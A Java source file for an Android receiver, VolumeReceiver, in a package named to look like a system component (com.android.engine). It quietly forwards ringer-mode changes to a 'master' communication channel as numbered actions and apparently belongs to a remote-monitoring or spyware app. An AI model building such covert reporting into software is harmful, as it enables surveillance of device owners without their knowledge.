package com.android.engine.receivers;

import Transfer.Action;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.engine.SendMasterCommunication;

import static android.media.AudioManager.EXTRA_RINGER_MODE;
import static android.media.AudioManager.RINGER_MODE_NORMAL;
import static android.media.AudioManager.RINGER_MODE_SILENT;
import static android.media.AudioManager.RINGER_MODE_VIBRATE;

public class VolumeReceiver extends BroadcastReceiver {

  public void onReceive(Context context, Intent intent) {
    try {
      Action action = new Action();
      action.ACTION = 122;
      switch (intent.getIntExtra(EXTRA_RINGER_MODE, -1)) {
        case RINGER_MODE_SILENT:
          action.DATA = "Silent";
          break;
        case RINGER_MODE_VIBRATE:
          action.DATA = "Vibrate";
          break;
        case RINGER_MODE_NORMAL:
          action.DATA = "Normal";
          break;
      }
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
    }
  }
}
